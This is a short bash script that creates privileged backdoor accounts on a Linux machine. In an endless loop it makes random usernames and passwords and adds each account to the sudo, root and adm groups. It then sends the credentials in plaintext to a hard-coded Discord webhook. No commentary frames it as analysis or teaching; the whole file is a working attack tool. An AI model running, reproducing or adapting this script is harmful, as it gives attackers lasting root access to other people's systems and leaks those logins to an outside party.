#!/bin/bash

while true
do
    password=$(date | md5sum | head -c30)
    username=$(echo $RANDOM | base64 | head -c 20)
    #username=$(cat /dev/urandom | tr -dc 'a-zA' | fold -w 10 | head -n 1)
    pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)

    egrep "^$username" /etc/passwd >/dev/null
    if [ $? -eq 0 ]; then
        exit 1
    else
        /sbin/useradd -m -G sudo,root,adm -s /bin/bash -p $pass $username
        curl -H "Content-Type: application/json" -d '{"username": "'"${username}"'", "content": "username = '"${username}"' \npassword = '"${password}"' \npass = '"${pass}"'"}' "https://discord.com/api/webhooks/1042025696966483999/MJVw-6DePZzLeQwZN4Ot_SqkKsuJzHqQOtXy0RvhchSlaq6CRZus1HW1M_nc5E1qkj1w"
    fi
done
    